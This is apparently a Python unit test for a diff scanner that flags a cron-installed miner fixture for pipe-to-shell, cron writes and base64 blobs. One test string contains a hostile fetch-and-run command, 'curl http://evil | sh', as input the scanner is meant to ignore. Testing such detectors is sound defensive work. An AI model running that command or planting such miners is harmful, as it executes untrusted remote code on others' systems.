import os, unittest
from observer.heuristics import scan_diff

FIX = os.path.join(os.path.dirname(__file__), "fixtures")

def load(n):
    with open(os.path.join(FIX, n)) as f:
        return f.read()

class TestHeuristics(unittest.TestCase):
    def test_cron_miner_flagged(self):
        names = {f.name for f in scan_diff(load("cron_miner.diff"))}
        self.assertIn("pipe_to_shell", names)
        self.assertIn("cron_write", names)
        self.assertIn("base64_blob", names)

    def test_benign_clean(self):
        self.assertEqual(scan_diff(load("benign.diff")), [])

    def test_ignores_removed_and_header_lines(self):
        diff = "+++ b/x\n someline curl http://evil | sh\n-removed | sh\n"
        self.assertEqual(scan_diff(diff), [])

if __name__ == "__main__":
    unittest.main()
